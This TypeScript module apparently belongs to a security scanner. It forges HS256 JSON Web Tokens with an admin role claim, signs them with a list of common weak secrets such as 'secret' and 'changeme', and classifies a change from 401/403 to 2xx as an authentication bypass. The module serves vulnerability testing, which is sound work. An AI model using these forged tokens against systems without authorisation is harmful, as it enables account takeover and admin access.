// Adapted from source-reference/vantix/secops/skills/ patterns.
// Rewritten in TypeScript. No runtime dependency on the vendored source.
import type { FamilyMetadata, OracleClassification, PayloadVariant, ProbeContext, ScannerResponseInput } from '../types';

export const META: FamilyMetadata = {
  id: 'jwt-weak-secret',
  family: 'jwt-attack',
  title: 'JWT weak/default HMAC secret',
  severity: 'critical',
  destructiveRisk: 'none',
  requiresOast: false,
  requiresBrowser: false,
  insertionPointKinds: ['header', 'cookie', 'query'],
  expectedSignals: ['auth-bypass', 'status-delta'],
  cwe: [321, 327],
};

// Minimal HMAC-SHA256 using Node built-ins (no external deps).
function hmacSha256(secret: string, data: string): string {
  // Runtime note: this is only used in tests/tooling where Node is available.
  // eslint-disable-next-line @typescript-eslint/no-var-requires
  const crypto: typeof import('crypto') = require('crypto');
  return crypto.createHmac('sha256', secret).update(data).digest('base64url');
}

function b64url(s: string): string {
  return Buffer.from(s).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
}

function makeHs256Jwt(secret: string, payload: Record<string, unknown>): string {
  const header = b64url(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
  const body = b64url(JSON.stringify(payload));
  const sig = hmacSha256(secret, `${header}.${body}`);
  return `${header}.${body}.${sig}`;
}

const BASE_PAYLOAD = { sub: '1', role: 'admin', iat: 1700000000, exp: 9999999999 };

const WEAK_SECRETS = [
  'secret',
  'password',
  '123456',
  'qwerty',
  'changeme',
  'your-256-bit-secret',
  'jwt_secret',
  'supersecret',
];

export function variants(_ctx: ProbeContext): PayloadVariant[] {
  return WEAK_SECRETS.map((secret, i) => ({
    id: `jwt-weak-secret-${i}`,
    family: 'jwt-attack' as const,
    value: makeHs256Jwt(secret, BASE_PAYLOAD),
    encoding: 'raw' as const,
    intent: `HS256 JWT signed with weak secret "${secret}"`,
    destructiveRisk: 'none' as const,
    expectedSignals: ['auth-bypass', 'status-delta'],
  }));
}

export function classify(
  resp: ScannerResponseInput,
  variant: PayloadVariant,
  baseline: ScannerResponseInput,
): OracleClassification {
  const evidence: string[] = [];
  let responseClass: OracleClassification['responseClass'] = 'neutral-or-not-parsed';
  let confidence = 0.1;
  let nextAction: OracleClassification['nextAction'] = 'continue';

  const wasUnauth = baseline.statusCode === 401 || baseline.statusCode === 403;
  const nowAuthed = resp.statusCode >= 200 && resp.statusCode < 300;

  if (wasUnauth && nowAuthed) {
    responseClass = 'expected-proof';
    confidence = 0.93;
    nextAction = 'promote-finding';
    evidence.push(`Auth bypass: ${baseline.statusCode} → ${resp.statusCode} after weak-secret JWT (variant: ${variant.id})`);
  } else if (baseline.statusCode !== resp.statusCode) {
    responseClass = 'status-delta';
    confidence = 0.5;
    nextAction = 'confirm';
    evidence.push(`Status delta ${baseline.statusCode}→${resp.statusCode} with variant ${variant.id}`);
  } else {
    evidence.push('No bypass observed for this secret candidate');
    nextAction = 'continue';
  }

  return { payloadVariantId: variant.id, responseClass, confidence, evidence, nextAction };
}
